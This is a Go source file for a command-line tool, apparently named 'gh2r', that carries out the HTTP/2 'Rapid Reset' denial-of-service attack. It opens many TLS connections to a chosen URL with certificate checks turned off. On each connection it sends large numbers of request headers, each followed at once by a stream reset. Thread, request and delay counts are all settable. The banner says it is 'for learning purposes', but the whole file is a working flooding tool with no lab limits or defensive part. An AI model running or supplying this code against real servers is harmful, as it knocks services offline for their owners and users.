package main

import (
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net/url"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// initialisation des variables flags
var reqcount int
var verbose bool
var nrequests int
var threads int
var conc int
var servurl string
var delayTime int

type connection struct {
	streamCounter uint32
	sentHeaders   int32
	framer        *http2.Framer
}

// flags init
func init() {
	gh2r := `	 __   _  _  
	/__|_| )|_) 
	\_|| |/_| \ `
	fmt.Printf("\x1b[31m")
	fmt.Println(gh2r)
	fmt.Println("created by \x1b[35mAika\x1b[0m, for learning purposes \x1b[31m<3\x1b[0m")
	fmt.Println("\x1b[35m==============================================================>>\x1b[0m")
	flag.BoolVar(&verbose, "v", false, "enable verbose (for debug only)")
	flag.IntVar(&threads, "t", 1000, "Number of connections to open")
	flag.IntVar(&nrequests, "r", 10000, "Number of requests to send for each connection")
	flag.StringVar(&servurl, "u", "", "<url>:<port>")
	flag.IntVar(&delayTime, "d", 0, "delay (ms) between the header and the rst")
	flag.IntVar(&conc, "c", 2, "max concurrence for goroutines")
	flag.Parse()
}

func main() {
	target, _ := url.Parse(servurl)
	// root path if not specified path
	connections := []*connection{}

	//init goroutines
	var connw8group sync.WaitGroup
	for i := 0; i < threads; i++ {
		con := &connection{
			streamCounter: 1,
			sentHeaders:   0,
		}
		connw8group.Add(1)
		go con.Start(target, func() {
			connw8group.Done()
		})
		connections = append(connections, con)
	}
	connw8group.Wait()

	fmt.Printf("[\x1b[36m+\x1b[0m]] done !")
}

func (c *connection) Start(target *url.URL, doneFunc func()) {
	reqcount = 0
	defer doneFunc()

	//tls config. set http/2 && ignore certificate verification;
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
	}

	//start tcp dial
	conn, err := tls.Dial("tcp", target.Host, tlsConfig)
	if err != nil {
		log.Fatalf("[-] failed to dial: %s", err)
	}
	//send preface
	_, err = conn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
	if err != nil {
		log.Fatalf("[-] preface failed. >> %s", err)
	}
	//start framer
	c.framer = http2.NewFramer(conn, conn)
	//start mutex
	var mu sync.Mutex
	//send settings
	mu.Lock()
	if err := c.framer.WriteSettings(); err != nil {
		log.Fatalf("[-] failed to write settings: %s", err)
	}
	mu.Unlock()
	//init channel
	concurrencyChan := make(chan struct{}, conc)
	var wg sync.WaitGroup
	// Send requests
	for i := 0; i < nrequests; i++ {
		//add new request, if concurrency allows it
		concurrencyChan <- struct{}{}
		wg.Add(1)
		go c.sendRequest(reqcount, target, delayTime, func() {
			//keep track of requests sent;
			mu.Lock()
			reqcount++
			fmt.Printf("\r			  headers sent : %d", reqcount) //live reqcount des entetes envoyées
			mu.Unlock()                                      //
			<-concurrencyChan
			wg.Done()
		})
	}
	// wait to finish all reqs
	wg.Wait()
}

func (c *connection) sendRequest(reqcount int, target *url.URL, delay int, doneFunc func()) {
	//decrement gr
	defer doneFunc()
	var headerBlock bytes.Buffer
	//hpack headers
	encoder := hpack.NewEncoder(&headerBlock)
	encoder.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	encoder.WriteField(hpack.HeaderField{Name: ":path", Value: "/"})
	encoder.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	encoder.WriteField(hpack.HeaderField{Name: ":authority", Value: target.Host})

	//allocate & increment stream ID (odd numbered, as per RFC9113)
	streamID := atomic.AddUint32(&c.streamCounter, 2)
	//send header
	if err := c.framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      streamID,
		BlockFragment: headerBlock.Bytes(),
		EndStream:     true,
		EndHeaders:    true,
	}); err != nil {
		if verbose {
			fmt.Printf("[-] header error : %d : %s\n", streamID, err)
		}
	} else {
		atomic.AddInt32(&c.sentHeaders, 1)
		if verbose {
			fmt.Printf("[+] header sent : %d\n", streamID)
		}
	}
	//delay b4 sending RST_STREAM
	time.Sleep(time.Millisecond * time.Duration(delay))
	//send reset
	if err := c.framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
		if verbose {
			fmt.Printf("[-] error stream %d , %s\n", streamID, err)
		}
	} else {
		fmt.Printf("[+] RST sent %d\n", streamID)
	}
}
